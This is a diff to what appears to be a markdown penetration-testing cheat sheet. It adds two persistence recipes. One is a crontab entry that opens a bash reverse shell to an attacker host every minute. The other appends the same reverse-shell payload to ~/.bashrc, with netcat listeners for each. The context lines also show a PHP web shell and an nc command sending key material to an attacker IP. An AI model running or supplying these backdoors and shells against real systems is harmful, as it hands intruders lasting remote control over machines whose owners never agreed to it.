@@ -220,6 +220,20 @@ nc <attacker ip> <port> < authorized_key #target
 ```php
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
+- Crontab backdoor
+```bash
+sudo crontab -e #sudo if you can, it's for add rule in crontab
+* * * * * bash -i >& /dev/tcp/<IP>/<port 0>&1 #execute every min this command
+nc -lvnp <port> #on your machine who want connect
+```
+- ~/.bashrc backdoor
+```bash
+#.bashrc, exe file launch when a termil bash it started
+cat /etc/passwd #verif if user use /bin/bash
+chsh -l <username> #modif default shell
+echo 'bash -i >& /dev/tcp/<IP>/<port> >&1' >> ~/.bashrc #payload backdoor
+nc -lvnp <port> #on your machine who want connect
+```
 ### 5. escalation privilege WINDOWS
 ## Important tools
 ### Burpsuite
